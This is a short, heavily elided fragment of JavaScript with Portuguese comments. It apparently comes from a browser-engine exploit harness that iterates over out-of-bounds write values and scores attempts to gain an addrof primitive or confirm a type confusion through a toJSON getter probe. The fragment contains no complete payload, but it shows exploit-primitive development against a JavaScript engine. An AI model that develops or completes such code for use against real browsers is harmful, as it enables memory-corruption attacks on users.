...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R18() { 
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        ...
        function toJSON_TA_Probe_Iter_Closure_R18() { /* ... (lógica da sonda como na R17, apenas atualizando logs para R18) ... */ 
        ...
        // Lógica ATUALIZADA para best_result_for_runner para priorizar a TC da Fase 1 se confirmada
        let current_best_score = (best_result_for_runner.addrof_A_result_core_func.success) ? 2 : (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
        let iter_score = (iter_addrof_core_result.success) ? 2 : (heisenbugConfirmedThisIter ? 1 : 0);

        if (iter_score > current_best_score || (iter_score === 1 && current_best_score === 0) /* Prioriza TC sobre nada */ || 
            (iter_score > 0 && !best_result_for_runner.oob_value_used) /* Primeira iteração com algum sucesso */ ) {
            ...
            // Se nenhuma "melhor" iteração foi encontrada, usa a última
